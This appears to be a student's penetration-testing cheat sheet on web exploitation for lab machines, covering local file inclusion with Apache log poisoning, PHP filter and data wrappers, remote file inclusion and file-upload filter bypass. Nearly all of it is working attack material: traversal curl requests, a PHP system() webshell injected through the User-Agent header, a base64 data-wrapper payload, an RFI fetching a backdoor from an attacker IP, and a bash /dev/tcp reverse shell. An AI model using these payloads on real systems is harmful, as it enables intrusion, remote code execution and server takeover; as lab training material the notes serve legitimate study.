Most boxes will probably be web exploitation for initial foothold.

Make sure to constantly fingerprint running services and applications on the website. -- could be the source for easy wins.





LFI

If you have access to log files, try log poisoning.

1. First, curl the log file to see which header is logged in the file. == curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log

2. Replace that header with this code == "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" >> "Mozilla/5.0 <?php echo system($_GET['cmd']); ?>" ALSO make sure the GET is ?page=admin.php

3. Attempt to use the command using a GET like this == /pizza/index.php?page=../../../../../../../../var/log/apache2/access.log&cmd=ls -la

4. If successful, attempt encoded GET request to obtain reverse shell. Remember, php natively uses the bourne again shell so our reverse shell cmd will look a little different == bash -c "bash -i >& /dev/tcp/<yourip>/<yourport> 0>&1" OR bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4



PHP WRAPPERS

EXAMPLE USAGE. == curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

BASE64 ENCODING == curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=<ADMIN.PHP or TRY directory traversal to a different file.>

Try using the data wrapper to execute cmds. == curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls" Make sure you also use urlencoding for the intended cmd.



RFI

1. check for rfi when you see an index.php?
  put this after index.php?view=C:\temp
    if blocked try view=c:temp

curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"


FILE UPLOAD VULNERABILITIES

NOTE: You can find webshells in a kali directory.

Upload shell trying to bypass filters

Once file is uploaded, attempt to reach it.

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
